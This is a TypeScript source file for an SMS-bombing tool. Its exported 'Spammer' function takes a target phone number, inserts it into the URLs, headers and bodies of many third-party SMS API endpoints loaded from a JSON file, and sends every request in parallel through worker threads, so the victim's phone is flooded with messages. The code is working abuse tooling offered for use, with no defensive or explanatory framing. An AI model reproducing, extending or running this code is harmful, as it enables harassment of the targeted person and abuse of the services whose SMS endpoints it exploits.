import * as smsApiData from "./smsApi.json"
import { Worker } from "worker_threads"
import path from "path"

export async function Spammer(target: number) {
  const workers: Array<Worker> = [];
  for (let key in smsApiData) {

    if (key === "default") continue

    const apiData = smsApiData[key];

    const url = apiData.url.replace("${target}", target);
    const method = apiData.method;
    const headers = JSON.parse(JSON.stringify(apiData.headers).replace("${target}", target.toString()));
    const data = JSON.parse(JSON.stringify(apiData.data).replace("${target}", target.toString()));

    const worker: Worker = new Worker(path.resolve(__dirname, './worker.js'), {
      workerData: {
        url, method, headers, data
      }
    })
    workers.push(worker);
  }
  await Promise.all(workers.map((worker) => new Promise((resolve, reject) => {
    worker.on("message", resolve);
    worker.on("error", reject);
    worker.on("exit", (code) => {
      if (code !== 0) reject(new Error(`Worker stopped with exit code ${code}`));
    });
  })));
}